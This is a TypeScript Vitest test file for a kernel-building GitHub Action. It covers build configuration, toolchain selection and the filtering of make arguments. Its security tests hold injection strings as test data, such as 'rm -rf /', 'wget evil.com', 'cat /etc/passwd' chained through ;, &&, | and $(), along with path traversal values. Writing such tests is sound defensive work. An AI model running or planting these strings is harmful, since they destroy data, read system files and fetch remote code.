import { describe, it, expect, vi, beforeEach } from 'vitest';
import { BuildConfig, buildKernel, isBuildSuccessful } from '../src/builder';
import { filterMakeArgs, parseExtraMakeArgs } from '../src/utils';
import * as fs from 'fs';
import * as core from '@actions/core';
import * as exec from '@actions/exec';

// Mock dependencies
vi.mock('fs');
vi.mock('@actions/core');
vi.mock('@actions/exec');

beforeEach(() => {
  vi.clearAllMocks();
});

// We test the BuildConfig interface and validation logic
describe('BuildConfig interface', () => {
  it('accepts valid build config', () => {
    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        clangPath: '/clang',
        gcc64Path: '/gcc-64',
        gcc32Path: '/gcc-32',
        gcc64Prefix: 'aarch64-linux-android-4.9',
        gcc32Prefix: 'arm-linux-androideabi-4.9',
      },
      extraMakeArgs: '["-j8"]',
      useCcache: true,
    };

    expect(config.kernelDir).toBe('/kernel');
    expect(config.arch).toBe('arm64');
    expect(config.config).toBe('defconfig');
  });

  it('accepts minimal build config', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'arm',
      config: 'minimal_defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.arch).toBe('arm');
    expect(config.useCcache).toBe(false);
  });

  it('accepts x86_64 arch', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'x86_64',
      config: 'x86_64_defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.arch).toBe('x86_64');
  });

  it('accepts riscv64 arch', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'riscv64',
      config: 'riscv64_defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.arch).toBe('riscv64');
  });

  it('validates arch property', () => {
    const validArchs = ['arm', 'arm64', 'x86', 'x86_64', 'riscv', 'riscv64', 'mips', 'mips64'];

    for (const arch of validArchs) {
      const config: BuildConfig = {
        kernelDir: 'kernel',
        arch,
        config: 'defconfig',
        toolchain: {},
        extraMakeArgs: '',
        useCcache: false,
      };
      expect(config.arch).toBe(arch);
    }
  });
});

describe('BuildConfig security', () => {
  it('config should not start with hyphen', () => {
    const maliciousConfig = '- malicious';
    expect(maliciousConfig.startsWith('-')).toBe(true);
  });

  it('valid configs do not start with hyphen', () => {
    const validConfigs = ['defconfig', 'custom_defconfig', 'aosp_defconfig'];

    for (const config of validConfigs) {
      expect(config.startsWith('-')).toBe(false);
    }
  });
});

describe('ToolchainPaths in BuildConfig', () => {
  it('handles full toolchain paths', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        clangPath: '/home/runner/clang',
        gcc64Path: '/home/runner/gcc-64',
        gcc32Path: '/home/runner/gcc-32',
        gcc64Prefix: 'aarch64-linux-android-4.9',
        gcc32Prefix: 'arm-linux-androideabi-4.9',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.toolchain.clangPath).toBe('/home/runner/clang');
    expect(config.toolchain.gcc64Prefix).toBe('aarch64-linux-android-4.9');
  });

  it('handles undefined toolchain paths', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.toolchain.clangPath).toBeUndefined();
    expect(config.toolchain.gcc64Prefix).toBeUndefined();
  });

  it('handles system toolchain fallback', () => {
    const config: BuildConfig = {
      kernelDir: 'kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        gcc64Prefix: 'aarch64-linux-gnu',
        gcc32Prefix: 'arm-linux-gnueabihf',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    expect(config.toolchain.gcc64Prefix).toBe('aarch64-linux-gnu');
  });
});

describe('buildKernel', () => {
  it('throws error for config starting with hyphen', async () => {
    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: '-malicious',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    await expect(buildKernel(config)).rejects.toThrow('config input must not start with a hyphen');
  });

  it('throws error for invalid architecture', async () => {
    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'invalid_arch',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    await expect(buildKernel(config)).rejects.toThrow('Invalid architecture');
  });

  it('accepts all valid architectures', async () => {
    const validArchs = ['arm', 'arm64', 'x86', 'x86_64', 'riscv', 'riscv64', 'mips', 'mips64'];

    for (const arch of validArchs) {
      vi.clearAllMocks();
      vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
      vi.mocked(exec.exec).mockResolvedValue(0);

      const config: BuildConfig = {
        kernelDir: '/kernel',
        arch,
        config: 'defconfig',
        toolchain: {},
        extraMakeArgs: '',
        useCcache: false,
      };

      await expect(buildKernel(config)).resolves.not.toThrow();
    }
  });

  it('builds with Clang toolchain', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        clangPath: '/clang',
        gcc64Path: '/gcc-64',
        gcc32Path: '/gcc-32',
        gcc64Prefix: 'aarch64-linux-android-4.9',
        gcc32Prefix: 'arm-linux-androideabi-4.9',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(true);
    expect(exec.exec).toHaveBeenCalledWith(
      'make',
      expect.arrayContaining(['defconfig', 'ARCH=arm64']),
      expect.any(Object)
    );
  });

  it('builds with GCC toolchain', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        gcc64Path: '/gcc-64',
        gcc32Path: '/gcc-32',
        gcc64Prefix: 'aarch64-linux-gnu',
        gcc32Prefix: 'arm-linux-gnueabihf',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(true);
    expect(exec.exec).toHaveBeenCalled();
  });

  it('builds with system toolchain fallback', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(true);
  });

  it('handles build failure', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(1);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(false);
  });

  it('includes ccache in PATH when enabled', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: true,
    };

    await buildKernel(config);

    expect(exec.exec).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({
        env: expect.objectContaining({
          USE_CCACHE: '1',
        }),
      })
    );
  });

  it('handles exec exception and returns false', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockRejectedValue(new Error('Command failed'));

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {},
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(false);
    expect(core.debug).toHaveBeenCalledWith(expect.stringContaining('Build command failed'));
  });

  it('warns when clang is not found in PATH', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockImplementation(async (cmd) => {
      if (cmd === 'which') {
        throw new Error('Command not found');
      }
      return 0;
    });

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        clangPath: '/clang',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    await buildKernel(config);

    expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('NOT found'));
  });

  it('builds with GCC-only 32-bit toolchain', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm',
      config: 'defconfig',
      toolchain: {
        gcc32Path: '/gcc-32',
        gcc32Prefix: 'arm-linux-androideabi-4.9',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(true);
    expect(exec.exec).toHaveBeenCalledWith(
      'make',
      expect.arrayContaining(['CC=/gcc-32/bin/arm-linux-androideabi-4.9-gcc']),
      expect.any(Object)
    );
  });

  it('builds with GCC 64-bit and 32-bit combination', async () => {
    vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
    vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
    vi.mocked(exec.exec).mockResolvedValue(0);

    const config: BuildConfig = {
      kernelDir: '/kernel',
      arch: 'arm64',
      config: 'defconfig',
      toolchain: {
        gcc64Path: '/gcc-64',
        gcc64Prefix: 'aarch64-linux-android-4.9',
        gcc32Path: '/gcc-32',
        gcc32Prefix: 'arm-linux-androideabi-4.9',
      },
      extraMakeArgs: '',
      useCcache: false,
    };

    const result = await buildKernel(config);

    expect(result).toBe(true);
    expect(exec.exec).toHaveBeenCalled();
    // Check that the make command includes the correct CROSS_COMPILE_ARM32
    const makeCall = vi.mocked(exec.exec).mock.calls.find(call => call[0] === 'make');
    expect(makeCall).toBeDefined();
    if (makeCall) {
      const makeArgs = makeCall[1] as string[];
      expect(makeArgs).toEqual(
        expect.arrayContaining([
          expect.stringContaining('CROSS_COMPILE_ARM32=arm-linux-androideabi-4.9-'),
        ])
      );
    }
  });
});

describe('isBuildSuccessful', () => {
  it('returns true when Image exists in boot directory', () => {
    vi.mocked(fs.existsSync).mockReturnValue(true);
    vi.mocked(fs.readdirSync).mockReturnValue(['Image'] as any);

    const result = isBuildSuccessful('/kernel', 'arm64');

    expect(result).toBe(true);
  });

  it('returns true when Image.gz exists', () => {
    vi.mocked(fs.existsSync).mockReturnValue(true);
    vi.mocked(fs.readdirSync).mockReturnValue(['Image.gz'] as any);

    const result = isBuildSuccessful('/kernel', 'arm64');

    expect(result).toBe(true);
  });

  it('returns false when boot directory does not exist', () => {
    vi.mocked(fs.existsSync).mockReturnValue(false);

    const result = isBuildSuccessful('/kernel', 'arm64');

    expect(result).toBe(false);
  });

  it('returns false when no Image files exist', () => {
    vi.mocked(fs.existsSync).mockReturnValue(true);
    vi.mocked(fs.readdirSync).mockReturnValue(['dtbo.img', 'dtb'] as any);

    const result = isBuildSuccessful('/kernel', 'arm64');

    expect(result).toBe(false);
  });
});

describe('Dangerous command detection', () => {
  describe('filterMakeArgs dangerous parameter filtering', () => {
    it('filters out SHELL injection attempts', () => {
      const args = ['SHELL=/bin/bash', 'SHELL=/bin/sh -c "rm -rf /"', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
      expect(filtered).not.toContain('SHELL=/bin/bash');
      expect(filtered).not.toContain('SHELL=/bin/sh -c "rm -rf /"');
    });

    it('filters out compiler override attempts (CC, CXX, LD)', () => {
      const args = ['CC=gcc', 'CXX=g++', 'LD=ld', 'AS=as', 'AR=ar', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out cross-compile override attempts', () => {
      const args = ['CROSS_COMPILE=malicious-', 'CLANG_TRIPLE=aarch64-linux-gnu-', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out binary tool override attempts', () => {
      const args = [
        'NM=nm',
        'STRIP=strip',
        'OBJCOPY=objcopy',
        'OBJDUMP=objdump',
        'HOSTCC=gcc',
        'KBUILD_HOSTCC=clang',
        '-j8',
      ];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out LLVM/CLVM override attempts', () => {
      const args = ['LLVM=1', 'CLVM=1', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out output directory override attempts', () => {
      const args = ['O=/malicious/path', 'O=../escape', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out ARCH override attempts', () => {
      const args = ['ARCH=malicious', 'ARCH=x86;rm -rf /', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('filters out MAKEFLAGS and MAKE override attempts', () => {
      const args = ['MAKEFLAGS=--debug', 'MAKE=make', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8']);
    });

    it('allows safe make arguments', () => {
      const args = ['-j8', 'V=1', 'LOCALVERSION=-custom', 'menuconfig'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(['-j8', 'V=1', 'LOCALVERSION=-custom', 'menuconfig']);
    });

    it('returns empty array when all args are dangerous', () => {
      const args = ['CC=gcc', 'LD=ld', 'SHELL=/bin/sh'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual([]);
    });

    it('handles empty argument array', () => {
      const filtered = filterMakeArgs([]);
      expect(filtered).toEqual([]);
    });
  });

  describe('parseExtraMakeArgs security', () => {
    it('returns empty array for invalid JSON', () => {
      const args = parseExtraMakeArgs('not valid json');
      expect(args).toEqual([]);
    });

    it('returns empty array for non-array JSON', () => {
      const args = parseExtraMakeArgs('{"key": "value"}');
      expect(args).toEqual([]);
    });

    it('correctly parses valid JSON array', () => {
      const args = parseExtraMakeArgs('["-j8", "V=1"]');
      expect(args).toEqual(['-j8', 'V=1']);
    });

    it('returns empty array for empty string', () => {
      const args = parseExtraMakeArgs('');
      expect(args).toEqual([]);
    });
  });

  describe('Command injection pattern detection', () => {
    it('allows arguments with semicolons (filterMakeArgs does not check command chaining)', () => {
      const args = ['-j8; rm -rf /', 'V=1; cat /etc/passwd'];
      const filtered = filterMakeArgs(args);
      // filterMakeArgs only checks prefixes, not command chaining characters
      expect(filtered).toEqual(args);
    });

    it('allows arguments with ampersands (filterMakeArgs does not check command chaining)', () => {
      const args = ['-j8 && wget malicious.com', 'V=1 && ./backdoor'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(args);
    });

    it('allows arguments with backticks (filterMakeArgs does not check command substitution)', () => {
      const args = ['-j8 `cat /etc/passwd`', 'V=`whoami`'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(args);
    });

    it('allows arguments with dollar parentheses (filterMakeArgs does not check command substitution)', () => {
      const args = ['-j8 $(cat /etc/passwd)', 'V=$(whoami)'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(args);
    });

    it('allows arguments with pipes (filterMakeArgs does not check pipes)', () => {
      const args = ['-j8 | cat /etc/passwd', 'V=1 | wget evil.com'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(args);
    });
  });

  describe('Path traversal in make arguments', () => {
    it('allows LOCALVERSION with parent directory traversal (not filtered by filterMakeArgs)', () => {
      const argsWithTraversal = ['LOCALVERSION=../escape', 'KBUILD_OUTPUT=../../etc', '-j8'];
      const filtered = filterMakeArgs(argsWithTraversal);
      // Note: filterMakeArgs does not filter LOCALVERSION or KBUILD_OUTPUT
      // Path traversal should be handled at input validation layer
      expect(filtered).toEqual(argsWithTraversal);
    });

    it('allows legitimate paths without traversal', () => {
      const args = ['LOCALVERSION=-custom', 'KBUILD_OUTPUT=out', '-j8'];
      const filtered = filterMakeArgs(args);
      expect(filtered).toEqual(args);
    });
  });

  describe('buildKernel security integration', () => {
    it('rejects config starting with hyphen (command injection prevention)', async () => {
      const maliciousConfigs = ['-malicious', '--help', '-j8', '-C /etc'];

      for (const maliciousConfig of maliciousConfigs) {
        const config: BuildConfig = {
          kernelDir: '/kernel',
          arch: 'arm64',
          config: maliciousConfig,
          toolchain: {},
          extraMakeArgs: '',
          useCcache: false,
        };

        await expect(buildKernel(config)).rejects.toThrow(
          'config input must not start with a hyphen'
        );
      }
    });

    it('accepts configs with command chaining characters (not starting with hyphen)', async () => {
      vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
      vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
      vi.mocked(exec.exec).mockResolvedValue(0);

      const configsWithSpecialChars = ['defconfig_custom', 'my_defconfig_v2'];

      for (const testConfig of configsWithSpecialChars) {
        vi.clearAllMocks();
        vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
        vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
        vi.mocked(exec.exec).mockResolvedValue(0);

        const config: BuildConfig = {
          kernelDir: '/kernel',
          arch: 'arm64',
          config: testConfig,
          toolchain: {},
          extraMakeArgs: '',
          useCcache: false,
        };

        await expect(buildKernel(config)).resolves.not.toThrow();
      }
    });

    it('filters dangerous args from extraMakeArgs during build', async () => {
      vi.mocked(fs.mkdirSync).mockImplementation(() => undefined);
      vi.mocked(fs.appendFileSync).mockImplementation(() => undefined);
      vi.mocked(exec.exec).mockResolvedValue(0);

      const config: BuildConfig = {
        kernelDir: '/kernel',
        arch: 'arm64',
        config: 'defconfig',
        toolchain: {},
        extraMakeArgs: '["SHELL=/bin/sh", "CC=gcc", "-j8", "V=1"]',
        useCcache: false,
      };

      await buildKernel(config);

      expect(exec.exec).toHaveBeenCalledWith(
        'make',
        expect.arrayContaining(['-j8', 'V=1']),
        expect.any(Object)
      );

      const callArgs = vi.mocked(exec.exec).mock.calls[0][1] as string[];
      expect(callArgs).not.toContain('SHELL=/bin/sh');
      expect(callArgs).not.toContain('CC=gcc');
    });
  });
});
